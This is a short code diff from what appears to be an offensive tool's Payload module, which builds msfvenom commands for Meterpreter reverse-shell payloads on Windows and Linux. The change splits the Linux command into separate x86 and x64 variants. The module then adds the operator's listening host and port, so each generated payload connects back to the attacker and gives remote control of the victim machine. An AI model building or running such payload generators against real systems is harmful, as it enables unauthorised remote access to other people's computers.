@@ -38,7 +38,10 @@ class Payload(controller.Module):
 					'x86': 'msfvenom -p windows/meterpreter/reverse_{} -a x86 '.format(self.protocol),
 					'x64': 'msfvenom -p windows/x64/meterpreter/reverse_{} -a x64 '.format(self.protocol)
 				},
-				'linux': 'msfvenom -p linux/{}/meterpreter/reverse_{} -a {} '.format(self.architecture, self.protocol, self.architecture)
+				'linux': {
+					'x86' : 'msfvenom -p linux/x86/meterpreter/reverse_{} -a x86 '.format(self.protocol),
+					'x64' : 'msfvenom -p linux/x64/meterpreter/reverse_{} -a x64 '.format(self.protocol)
+				}
 			}
 			randiter = str(random.randint(7, 18))
 			generate = generate[self.platform][self.architecture] + 'lhost={} lport={} '.format(self.lhost, self.lport)
